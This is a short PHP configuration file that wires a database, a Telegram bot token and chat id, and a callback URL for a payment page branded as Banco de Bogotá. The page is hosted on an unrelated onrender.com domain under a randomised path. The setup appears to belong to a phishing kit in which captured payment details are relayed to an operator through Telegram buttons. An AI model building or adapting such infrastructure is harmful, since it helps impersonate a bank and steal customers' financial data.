<?php
// pago/1a9f3d8c/assets/config/conexion.php — Configuración Unificada Banco de Bogotá
$masterConfig = include __DIR__ . '/../../../../config.php';

$host     = $masterConfig['db_host'];
$port     = (string)$masterConfig['db_port'];
$dbname   = $masterConfig['db_name'];
$user     = $masterConfig['db_user'];
$password = $masterConfig['db_pass'];
$tg_token = $masterConfig['botToken'];
$tg_chat  = $masterConfig['chatId'];

// Base URL para actualización de botones Telegram en Bogotá
$base_url = 'https://facturaairepago-fyd1.onrender.com/pago/1a9f3d8c/assets/modules/api/actualizar_estado.php';
if (!empty($masterConfig['baseUrl']) && strpos($masterConfig['baseUrl'], 'http') === 0) {
    $parsed = parse_url($masterConfig['baseUrl']);
    $scheme = $parsed['scheme'] ?? 'https';
    $host_url = $parsed['host'] ?? 'facturaairepago-fyd1.onrender.com';
    $base_url = "{$scheme}://{$host_url}/pago/1a9f3d8c/assets/modules/api/actualizar_estado.php";
}

// Endpoint Neon si aplica
$endpoint_id = explode('.', $host)[0];
$host_dsn = $host;
if (strpos($host, 'neon.tech') !== false && !empty($endpoint_id)) {
    $host_dsn = "{$host};port={$port};sslmode=require;options=endpoint={$endpoint_id}";
}

return [
    'telegram' => [
        'bot_token' => $tg_token,
        'chat_id'   => $tg_chat,
    ],
    'db' => [
        'driver'   => 'pgsql',
        'host'     => $host_dsn,
        'dbname'   => $dbname,
        'user'     => $user,
        'password' => $password,
        'port'     => $port,
    ],
    'base_url' => $base_url,
];
?>